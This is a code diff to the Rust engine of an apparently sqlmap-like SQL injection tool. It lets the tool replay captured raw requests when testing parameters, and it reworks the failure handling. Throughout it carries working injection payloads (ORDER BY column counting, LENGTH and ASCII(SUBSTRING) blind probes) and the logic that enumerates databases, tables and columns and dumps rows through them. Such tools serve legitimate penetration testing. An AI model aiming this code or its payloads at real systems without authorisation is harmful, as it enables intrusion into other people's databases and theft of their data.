@@ -10,6 +10,7 @@ use crate::{
     target::{
         markers::MarkerSet,
         parameters::{ParameterLocation, TargetParameter},
+        raw_request::RawRequest,
         url::TargetUrl,
     },
     techniques::{
@@ -116,6 +117,22 @@ impl Engine {
     }
 
     pub async fn run(&self, target_str: &str) -> anyhow::Result<EngineState> {
+        self.run_internal(target_str, None).await
+    }
+
+    pub async fn run_candidate(
+        &self,
+        candidate: &crate::recon::ParameterCandidate,
+    ) -> anyhow::Result<EngineState> {
+        self.run_internal(candidate.url.as_str(), Some(candidate))
+            .await
+    }
+
+    async fn run_internal(
+        &self,
+        target_str: &str,
+        candidate: Option<&crate::recon::ParameterCandidate>,
+    ) -> anyhow::Result<EngineState> {
         let mut current = EngineState::Parse;
         info!(target=%self.scrubber.scrub(target_str), state=?current, "engine start");
 
@@ -128,6 +145,9 @@ impl Engine {
         if self.cancel.is_cancelled() {
             return Ok(EngineState::Done);
         }
+
+        let raw_request = candidate.map(crate::recon::ParameterCandidate::raw_request);
+        let candidate_param = candidate.map(crate::recon::ParameterCandidate::target_parameter);
 
         // Baseline: 3-5 requests
         let pb = ProgressBar::new_spinner();
@@ -145,18 +165,11 @@ impl Engine {
                 break;
             }
             let start = Instant::now();
-            let resp = self
-                .client
-                .send_with_retry(
-                    RequestSpec {
-                        method: Method::GET,
-                        url: target.as_str().to_owned(),
-                        headers: http::HeaderMap::new(),
-                        body: None,
-                    },
-                    &self.cancel,
-                )
-                .await;
+            let spec = raw_request.as_ref().map_or_else(
+                || RequestSpec::get(target.as_str().to_owned()),
+                |raw| request_spec_from_raw(&target, raw),
+            );
+            let resp = self.client.send_with_retry(spec, &self.cancel).await;
             let elapsed = start.elapsed();
             match resp {
                 Ok(r) => {
@@ -177,6 +190,13 @@ impl Engine {
                 }
                 Err(e) => warn!(error=%e, "baseline request failed"),
             }
+        }
+        if samples.is_empty() {
+            pb.finish_with_message("baseline failed");
+            if self.cancel.is_cancelled() {
+                return Ok(EngineState::Done);
+            }
+            anyhow::bail!("baseline failed: no successful responses from target after 3 attempts");
         }
         pb.finish_with_message("baseline done");
         let baseline = baseline::Baseline::new(samples);
@@ -213,7 +233,9 @@ impl Engine {
         }
         // Always include real query params even when markers present (fixes #6)
         params.extend(crate::target::parameters::collect_from_url_query(&target));
-        let to_test: Vec<TargetParameter> = if params.is_empty() {
+        let to_test: Vec<TargetParameter> = if let Some(param) = candidate_param {
+            vec![param]
+        } else if params.is_empty() {
             vec![TargetParameter::new("id", ParameterLocation::Query, "1")]
         } else {
             params
@@ -232,6 +254,7 @@ impl Engine {
         let baseline_clone = baseline.clone();
         let target_clone = target.clone();
         let marker_set_clone = marker_set.clone();
+        let raw_request = Arc::new(raw_request);
 
         let stream = futures::stream::iter(to_test)
             .map(|param| {
@@ -244,6 +267,7 @@ impl Engine {
                 let cancel = self.cancel.clone();
                 let config = self.config.clone();
                 let pb2 = Arc::clone(&pb2);
+                let raw_request = Arc::clone(&raw_request);
                 async move {
                     if cancel.is_cancelled() {
                         pb2.inc(1);
@@ -264,6 +288,7 @@ impl Engine {
                             &param,
                             &baseline,
                             &marker_set,
+                            raw_request.as_ref().as_ref(),
                         )
                         .await;
                     }
@@ -276,6 +301,7 @@ impl Engine {
                             &target_str,
                             &param,
                             &marker_set,
+                            raw_request.as_ref().as_ref(),
                         )
                         .await;
                     }
@@ -289,6 +315,7 @@ impl Engine {
                             &param,
                             &baseline,
                             &marker_set,
+                            raw_request.as_ref().as_ref(),
                         )
                         .await;
                     }
@@ -302,6 +329,7 @@ impl Engine {
                             &param,
                             &baseline,
                             &marker_set,
+                            raw_request.as_ref().as_ref(),
                         )
                         .await;
                     }
@@ -319,6 +347,7 @@ impl Engine {
                             &param,
                             &baseline,
                             &marker_set,
+                            raw_request.as_ref().as_ref(),
                         )
                         .await;
                     }
@@ -415,6 +444,7 @@ impl Engine {
             let target_clone2 = target_for_extract.clone();
             let first_param_clone = first_param.clone();
             let marker_set_clone = marker_set.clone();
+            let raw_request_clone = raw_request.as_ref().clone();
 
             // First, infer length via LENGTH(query) if possible (try lengths 1..64)
             // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
@@ -443,12 +473,13 @@ impl Engine {
                 // Retry logic: require 2 probes, treat as true only if majority true
                 let mut true_count = 0usize;
                 for _ in 0..2 {
-                    let spec = build_injection_spec(
+                    let spec = build_injection_spec_with_raw(
                         &target_clone2,
                         &target_str_clone,
                         &first_param_clone,
                         &payload,
                         &marker_set_clone,
+                        raw_request_clone.as_ref(),
                     );
                     let start = Instant::now();
                     let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
@@ -503,6 +534,7 @@ impl Engine {
             let target_for_oracle = target_clone2.clone();
             let param_for_oracle = first_param_clone.clone();
             let marker_for_oracle = marker_set_clone.clone();
+            let raw_for_oracle = raw_request.as_ref().clone();
 
             let target_str_for_oracle = target_str_clone.clone();
             let oracle = move |pos: usize, mid: u8| {
@@ -512,6 +544,7 @@ impl Engine {
                 let target = target_for_oracle.clone();
                 let param = param_for_oracle.clone();
                 let marker_set = marker_for_oracle.clone();
+                let raw = raw_for_oracle.clone();
                 let baseline_body = baseline_body2.clone();
                 let version_query = version_query_owned.clone();
                 let dbms_kind = dbms_for_closure.clone();
@@ -546,8 +579,14 @@ impl Engine {
                         ),
                     };
                     // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling
-                    let spec =
-                        build_injection_spec(&target, &target_str, &param, &payload, &marker_set);
+                    let spec = build_injection_spec_with_raw(
+                        &target,
+                        &target_str,
+                        &param,
+                        &payload,
+                        &marker_set,
+                        raw.as_ref(),
+                    );
                     let start = Instant::now();
                     let resp = client.send_with_retry(spec, &cancel).await;
                     let ms = start.elapsed().as_secs_f64() * 1000.0;
@@ -584,7 +623,8 @@ impl Engine {
             || self.config.columns
             || self.config.dump
             || self.config.count;
-        if needs_enum {
+        let has_findings_for_enum = !self.state.read().await.findings().is_empty();
+        if needs_enum && has_findings_for_enum {
             current = EngineState::Enumeration;
             info!(state=?current, "phase enumeration — dbs/tables/columns/dump");
 
@@ -633,6 +673,7 @@ impl Engine {
             let cancel = self.cancel.clone();
             let target_str = target_str.to_owned();
             let marker_set = marker_set.clone();
+            let raw_request_for_enum = raw_request.as_ref().clone();
 
             let start = self.config.start.unwrap_or(0);
             let stop = self.config.stop.unwrap_or(100);
@@ -651,13 +692,16 @@ impl Engine {
                     baseline_mean,
                     query.clone(),
                     "databases".to_owned(),
+                    raw_request_for_enum.as_ref(),
                 )
                 .await;
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
+                if let Some(extracted) = extracted {
+                    info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
+                    self.state
+                        .write()
+                        .await
+                        .push_extracted(secrecy::SecretString::from(extracted));
+                }
             }
 
             let target_db = self.config.db.clone().unwrap_or_default();
@@ -675,13 +719,16 @@ impl Engine {
                     baseline_mean,
                     query.clone(),
                     "tables".to_owned(),
+                    raw_request_for_enum.as_ref(),
                 )
                 .await;
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
+                if let Some(extracted) = extracted {
+                    info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
+                    self.state
+                        .write()
+                        .await
+                        .push_extracted(secrecy::SecretString::from(extracted));
+                }
             }
 
             let target_table = self.config.table.clone().unwrap_or_default();
@@ -699,13 +746,16 @@ impl Engine {
                     baseline_mean,
                     query.clone(),
                     "columns".to_owned(),
+                    raw_request_for_enum.as_ref(),
                 )
                 .await;
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
+                if let Some(extracted) = extracted {
+                    info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
+                    self.state
+                        .write()
+                        .await
+                        .push_extracted(secrecy::SecretString::from(extracted));
+                }
             }
 
             if self.config.dump && !target_db.is_empty() && !target_table.is_empty() {
@@ -729,13 +779,16 @@ impl Engine {
                     baseline_mean,
                     query.clone(),
                     "dump".to_owned(),
+                    raw_request_for_enum.as_ref(),
                 )
                 .await;
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
+                if let Some(extracted) = extracted {
+                    info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
+                    self.state
+                        .write()
+                        .await
+                        .push_extracted(secrecy::SecretString::from(extracted));
+                }
             }
 
             if self.config.count && !target_db.is_empty() && !target_table.is_empty() {
@@ -752,14 +805,19 @@ impl Engine {
                     baseline_mean,
                     query.clone(),
                     "count".to_owned(),
+                    raw_request_for_enum.as_ref(),
                 )
                 .await;
-                info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
-                self.state
-                    .write()
-                    .await
-                    .push_extracted(secrecy::SecretString::from(extracted));
+                if let Some(extracted) = extracted {
+                    info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
+                    self.state
+                        .write()
+                        .await
+                        .push_extracted(secrecy::SecretString::from(extracted));
+                }
             }
+        } else if needs_enum {
+            warn!("enumeration requested but no confirmed vulnerability was found");
         }
 
         current = EngineState::Done;
@@ -1013,14 +1071,25 @@ fn inject_body_param(
     (method, body_str, headers)
 }
 
-fn build_injection_spec(
-    target: &TargetUrl,
-    target_str: &str,
-    param: &TargetParameter,
-    payload: &str,
-    marker_set: &MarkerSet,
-) -> RequestSpec {
-    build_injection_spec_with_raw(target, target_str, param, payload, marker_set, None)
+fn request_spec_from_raw(target: &TargetUrl, raw: &RawRequest) -> RequestSpec {
+    let method = Method::from_bytes(raw.method.as_bytes()).unwrap_or(Method::GET);
+    let mut headers = http::HeaderMap::new();
+    for (k, v) in &raw.headers {
+        if k.eq_ignore_ascii_case("content-length") || k.eq_ignore_ascii_case("host") {
+            continue;
+        }
+        if let (Ok(name), Ok(value)) = (
+            http::HeaderName::from_bytes(k.as_bytes()),
+            http::HeaderValue::from_str(v),
+        ) {
+            headers.insert(name, value);
+        }
+    }
+    let mut spec = RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers);
+    if let Some(body) = &raw.body {
+        spec = spec.with_body(body.as_bytes().to_vec());
+    }
+    spec
 }
 
 fn build_injection_spec_with_raw(
@@ -1134,8 +1203,9 @@ async fn fetch_for_payload(
     param: &TargetParameter,
     payload: &str,
     marker_set: &MarkerSet,
+    raw: Option<&RawRequest>,
 ) -> (String, f64) {
-    let spec = build_injection_spec(target, target_str, param, payload, marker_set);
+    let spec = build_injection_spec_with_raw(target, target_str, param, payload, marker_set, raw);
     let start = Instant::now();
     let resp = client.send_with_retry(spec, cancel).await;
     let elapsed = start.elapsed().as_secs_f64() * 1000.0;
@@ -1206,6 +1276,7 @@ async fn test_boolean_bounded(
     param: &TargetParameter,
     baseline: &baseline::Baseline,
     marker_set: &MarkerSet,
+    raw: Option<&RawRequest>,
 ) {
     let payloads = boolean_payloads_for(None);
     let detector = BooleanDetector::new();
@@ -1230,6 +1301,7 @@ async fn test_boolean_bounded(
                 param,
                 &p.true_payload,
                 marker_set,
+                raw,
             )
             .await;
             let (false_body, false_ms) = fetch_for_payload(
@@ -1241,6 +1313,7 @@ async fn test_boolean_bounded(
                 param,
                 &p.false_payload,
                 marker_set,
+                raw,
             )
             .await;
             let res = detector.evaluate(
@@ -1286,6 +1359,7 @@ async fn test_error_bounded(
     target_str: &str,
     param: &TargetParameter,
     marker_set: &MarkerSet,
+    raw: Option<&RawRequest>,
 ) {
     let detector = ErrorDetector::new();
     let payloads = crate::techniques::error::payloads::error_payloads_for(None);
@@ -1294,7 +1368,7 @@ async fn test_error_bounded(
             break;
         }
         let (body, _ms) = fetch_for_payload(
-            client, state, cancel, target, target_str, param, &p.payload, marker_set,
+            client, state, cancel, target, target_str, param, &p.payload, marker_set, raw,
         )
         .await;
         let r = detector.evaluate(&body);
@@ -1323,6 +1397,7 @@ async fn test_time_bounded(
     param: &TargetParameter,
     baseline: &baseline::Baseline,
     marker_set: &MarkerSet,
+    raw: Option<&RawRequest>,
 ) {
     let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
     let payload = time_payload_for(None, 3.0);
@@ -1335,6 +1410,7 @@ async fn test_time_bounded(
         param,
         &payload.payload,
         marker_set,
+        raw,
     )
     .await;
     let r = detector.evaluate(ms, payload.sleep_secs);
@@ -1368,6 +1444,7 @@ async fn enumerate_columns_via_order_by(
     param: &TargetParameter,
     marker_set: &MarkerSet,
     detector: &UnionDetector,
+    raw: Option<&RawRequest>,
 ) -> Option<usize> {
     const MAX_ORDER_BY_COLS: usize = 10;
     for i in 1..=MAX_ORDER_BY_COLS {
@@ -1376,7 +1453,7 @@ async fn enumerate_columns_via_order_by(
         }
         let payload = format!("' ORDER BY {i} -- -");
         let (body, _ms) = fetch_for_payload(
-            client, state, cancel, target, target_str, param, &payload, marker_set,
+            client, state, cancel, target, target_str, param, &payload, marker_set, raw,
         )
         .await;
         if detector.evaluate_order_by(&body) {
@@ -1403,6 +1480,7 @@ async fn test_union_bounded(
     param: &TargetParameter,
     baseline: &baseline::Baseline,
     marker_set: &MarkerSet,
+    raw: Option<&RawRequest>,
 ) {
     let detector = UnionDetector::new();
     let baseline_body = baseline.representative_body_str();
@@ -1412,7 +1490,7 @@ async fn test_union_bounded(
     // still fall back to the heuristic list (excluding the already-tried `n`) to
     // keep coverage for edge cases where ORDER BY is WAF-filtered but UNION still works.
     let inferred = enumerate_columns_via_order_by(
-        client, state, cancel, target, target_str, param, marker_set, &detector,
+        client, state, cancel, target, target_str, param, marker_set, &detector, raw,
     )
     .await;
 
@@ -1439,7 +1517,7 @@ async fn test_union_bounded(
                 return;
             }
             let (body, ms) = fetch_for_payload(
-                client, state, cancel, target, target_str, param, &p.payload, marker_set,
+                client, state, cancel, target, target_str, param, &p.payload, marker_set, raw,
             )
             .await;
             let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
@@ -1472,7 +1550,7 @@ async fn test_union_bounded(
                 break;
             }
             let (body, ms) = fetch_for_payload(
-                client, state, cancel, target, target_str, param, &p.payload, marker_set,
+                client, state, cancel, target, target_str, param, &p.payload, marker_set, raw,
             )
             .await;
             let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
@@ -1505,6 +1583,7 @@ async fn test_stacked_bounded(
     param: &TargetParameter,
     baseline: &baseline::Baseline,
     marker_set: &MarkerSet,
+    raw: Option<&RawRequest>,
 ) {
     let detector = StackedDetector::new();
     let baseline_body = baseline.representative_body_str();
@@ -1514,7 +1593,7 @@ async fn test_stacked_bounded(
             break;
         }
         let (body, ms) = fetch_for_payload(
-            client, state, cancel, target, target_str, param, &p.payload, marker_set,
+            client, state, cancel, target, target_str, param, &p.payload, marker_set, raw,
         )
         .await;
         let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, p);
@@ -1552,7 +1631,8 @@ async fn extract_enum_field(
     baseline_mean: f64,
     query: String,
     label: String,
-) -> String {
+    raw: Option<&RawRequest>,
+) -> Option<String> {
     let engine = crate::extraction::engine::ExtractionEngine::new(
         crate::extraction::engine::ExtractionConfig::default(),
     );
@@ -1564,7 +1644,8 @@ async fn extract_enum_field(
             break;
         }
         let payload = format!("' AND LENGTH(({query}))>={len_guess} -- -");
-        let spec = build_injection_spec(target, target_str, param, &payload, marker_set);
+        let spec =
+            build_injection_spec_with_raw(target, target_str, param, &payload, marker_set, raw);
         let start = std::time::Instant::now();
         let resp = client.send_with_retry(spec, cancel).await;
         let ms = start.elapsed().as_secs_f64() * 1000.0;
@@ -1587,7 +1668,8 @@ async fn extract_enum_field(
         }
     }
     if inferred_len == 0 {
-        inferred_len = 50; // fallback
+        warn!(label=%label, "enumeration length inference failed");
+        return None;
     }
 
     let client_clone = client.clone();
@@ -1600,6 +1682,7 @@ async fn extract_enum_field(
     let baseline_body_clone = baseline_body.to_owned();
     let baseline_mean_clone = baseline_mean;
     let query_for_oracle = query.clone();
+    let raw_for_oracle = raw.cloned();
 
     let oracle = move |pos: usize, mid: u8| {
         let client = client_clone.clone();
@@ -1611,13 +1694,21 @@ async fn extract_enum_field(
         let marker_set = marker_set_clone.clone();
         let baseline_body = baseline_body_clone.clone();
         let query = query_for_oracle.clone();
+        let raw = raw_for_oracle.clone();
         async move {
             let payload = format!(
                 "' AND ASCII(SUBSTRING(({query}),{},1))>={} -- -",
                 pos + 1,
                 mid
             );
-            let spec = build_injection_spec(&target, &target_str, &param, &payload, &marker_set);
+            let spec = build_injection_spec_with_raw(
+                &target,
+                &target_str,
+                &param,
+                &payload,
+                &marker_set,
+                raw.as_ref(),
+            );
             let start = std::time::Instant::now();
             let resp = client.send_with_retry(spec, &cancel).await;
             let ms = start.elapsed().as_secs_f64() * 1000.0;
@@ -1643,5 +1734,5 @@ async fn extract_enum_field(
         extracted.expose_secret().to_owned()
     };
     info!(label=%label, extracted=%crate::session::scrubber::Scrubber::hash_truncated(&exposed), len=%exposed.len(), "enumeration extracted");
-    exposed
+    Some(exposed)
 }
